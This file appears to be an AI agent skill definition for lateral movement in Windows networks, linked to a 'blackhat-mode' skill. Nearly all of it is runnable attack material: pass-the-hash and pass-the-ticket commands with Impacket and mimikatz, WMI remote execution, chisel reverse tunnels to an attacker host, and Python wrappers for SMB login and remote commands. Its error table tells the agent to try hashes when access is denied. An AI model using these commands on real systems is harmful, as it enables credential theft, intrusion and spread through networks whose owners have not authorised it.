---
name: lateral-tools
description: "Lateral movement — pass-the-hash, pass-the-ticket, PsExec, WMI, pivoting."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [lateral, pivoting, pth, ptt, psexec, wmi, smb]
    related_skills: [blackhat-mode, post-tools, cred-tools, windows-privesc-tools]
prerequisites:
  commands: [python]
---

# Lateral Movement Tools

## When to Load This Skill

User requests:
- "lateral movement", "pivot", "pass the hash", "PsExec", "WMI"

---

## Pass-the-Hash

```bash
# Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH DOMAIN/user@TARGET

# SMBExec
smbexec.py -hashes :HASH DOMAIN/user@TARGET

# WMIExec
wmiexec.py -hashes :HASH DOMAIN/user@TARGET
```

## Pass-the-Ticket

```bash
# Export tickets
mimikatz
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Use
psexec.py -k -no-pass DOMAIN/user@TARGET
```

## PsExec

```bash
# Basic
psexec.py DOMAIN/user:password@TARGET

# With hash
psexec.py -hashes :HASH DOMAIN/user@TARGET

# System
psexec.py -hashes :HASH DOMAIN/user@TARGET -target-ip TARGET
```

## WMI

```bash
# Execute
wmiexec.py DOMAIN/user:password@TARGET

# Query
wmic /node:TARGET process call create "cmd.exe /c whoami"
```

## Pivoting

```bash
# SSH tunnel
ssh -L 8080:INTERNAL:80 USER@JUMP

# Dynamic
ssh -D 1080 USER@JUMP

# Chisel
chisel server --reverse --port 8080
chisel client ATTACKER:8080 R:socks

# Proxychains
proxychains nmap -sT INTERNAL
```

---

## Python Lateral Tools

### SMB Connector

```python
from impacket.smbconnection import SMBConnection

def smb_connect(target, username, password):
    conn = SMBConnection(target, target)
    conn.login(username, password)
    
    # List shares
    shares = conn.listShares()
    return [share['shi1_netname'][:-1] for share in shares]
```

### PsExec Wrapper

```python
import subprocess

def psexec(target, username, password, command):
    result = subprocess.run([
        'psexec.py',
        f'{username}:{password}@{target}',
        command
    ], capture_output=True, text=True)
    
    return result.stdout
```

---

## Output Format

```json
{
  "source": "192.168.1.100",
  "target": "192.168.1.200",
  "method": "pass_the_hash",
  "success": true,
  "commands": ["whoami"]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Access denied | Wrong creds | Try hash |
| Connection failed | SMB blocked | Try WMI |
| Auth failed | Kerberos issue | Check time sync |
